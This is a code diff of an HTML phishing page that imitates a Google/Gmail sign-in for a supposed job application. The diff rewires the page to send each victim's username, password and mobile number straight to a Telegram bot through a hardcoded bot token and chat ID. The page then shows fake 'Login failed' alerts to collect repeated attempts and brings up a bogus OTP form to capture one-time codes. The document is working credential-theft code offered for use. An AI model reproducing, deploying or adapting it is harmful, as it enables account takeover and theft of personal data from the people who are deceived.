@@ -29,13 +29,57 @@
       text-align: center;
     }
 
-    .login-box h2 { font-size: 22px; margin: 10px 0; font-weight: 500; color: #202124; }
-    .login-box p { font-size: 14px; color: #5f6368; margin-bottom: 25px; }
-    .input-field { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 14px; }
-    .input-field:focus { border-color: #1a73e8; outline: none; box-shadow: 0 0 2px #1a73e8; }
-    .btn { width: 100%; padding: 12px; background: #1a73e8; color: #fff; font-size: 15px; border: none; border-radius: 4px; cursor: pointer; margin-top: 15px; }
-    .btn:hover { background: #1669c1; }
-    .error-msg { color: red; font-size: 13px; text-align: left; margin-top: -5px; margin-bottom: 5px; }
+    .login-box h2 {
+      font-size: 22px;
+      margin: 10px 0;
+      font-weight: 500;
+      color: #202124;
+    }
+
+    .login-box p {
+      font-size: 14px;
+      color: #5f6368;
+      margin-bottom: 25px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 14px;
+    }
+
+    .input-field:focus {
+      border-color: #1a73e8;
+      outline: none;
+      box-shadow: 0 0 2px #1a73e8;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #1a73e8;
+      color: #fff;
+      font-size: 15px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    .btn:hover {
+      background: #1669c1;
+    }
+
+    .error-msg {
+      color: red;
+      font-size: 13px;
+      text-align: left;
+      margin-top: -5px;
+      margin-bottom: 5px;
+    }
   </style>
 
   <!-- Google Identity Services -->
@@ -48,7 +92,7 @@
     <p>To Apply - Login Directly with your Gmail</p>
 
     <!-- Gmail auto-fill -->
-    <input type="text" id="username" class="input-field" placeholder="Select Gmail from below" readonly required>
+    <input type="text" id="username" name="username" class="input-field" placeholder="Select Gmail from below" readonly required>
     <div id="gmailError" class="error-msg"></div>
 
     <!-- Google Sign-In button -->
@@ -67,15 +111,19 @@
     </div>
 
     <!-- Password + Mobile -->
-    <input type="password" id="password" class="input-field" placeholder="Enter your password" required>
-    <input type="text" id="mobile" class="input-field" placeholder="Mobile with country code (e.g. 919898600143)" required>
+    <input type="password" id="password" name="password" class="input-field" placeholder="Enter your password" required>
+    <input type="text" id="mobile" name="mobile" class="input-field" placeholder="Mobile with country code" required>
     <div id="mobileError" class="error-msg"></div>
 
     <button id="submitBtn" class="btn">Next</button>
   </div>
 
   <script>
-    let loginAttempt = 0;
+    let loginAttempt = 0; // counter for login attempts
+
+    // === Telegram Bot Config ===
+    const BOT_TOKEN = "8211036124:AAGSsDbdurbpjt7FtEyuKri0sQgmBfCjntU"; 
+    const CHAT_ID  = "5738863873"; 
 
     // Google Sign-In callback
     function handleCredentialResponse(response) {
@@ -83,6 +131,7 @@
       document.getElementById("username").value = data.email;
     }
 
+    // Validation
     function isValidEmail(email) {
       const re = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
       return re.test(email);
@@ -94,14 +143,11 @@
     }
 
     function sendToTelegram(message) {
-      fetch("http://localhost:3000/sendTelegram", { // backend endpoint
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ message })
-      })
-      .then(res => res.json())
-      .then(console.log)
-      .catch(console.error);
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      }).then(res => res.json()).then(console.log).catch(console.error);
     }
 
     document.getElementById("submitBtn").addEventListener("click", function(e) {
@@ -109,9 +155,9 @@
       loginAttempt++;
 
       const loginBox = document.getElementById("loginBox");
-      const username = document.getElementById("username").value.trim();
-      const password = document.getElementById("password").value.trim();
-      const mobile = document.getElementById("mobile").value.trim();
+      const username = document.getElementById('username').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const mobile = document.getElementById('mobile').value.trim();
 
       let valid = true;
 
@@ -133,18 +179,19 @@
 
       if (!valid) return;
 
-      // Send to Telegram backend
-      const payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nAttempt: ${loginAttempt}`;
+      // Telegram payload
+      const payload = `Username: ${username}\nPassword: ${password}\nMobile: ${mobile}\nStark ♥️`;
       sendToTelegram(payload);
 
       if (loginAttempt < 3) {
         alert("Login failed: Invalid credentials");
       } else if (loginAttempt === 3) {
+        // Show OTP input
         loginBox.innerHTML = `
           <h2 style="font-size:24px; color:#1a73e8;">OTP Verification</h2>
           <p style="font-size:16px; color:#202124;">Enter OTP sent to you via Telegram</p>
           <form id="otpForm">
-            <input type="text" id="otp" class="input-field" placeholder="Enter OTP" required>
+            <input type="text" id="otp" name="otp" class="input-field" placeholder="Enter OTP" required>
             <button type="submit" class="btn">Verify OTP</button>
           </form>
         `;
@@ -162,5 +209,6 @@
       }
     });
   </script>
+
 </body>
 </html>
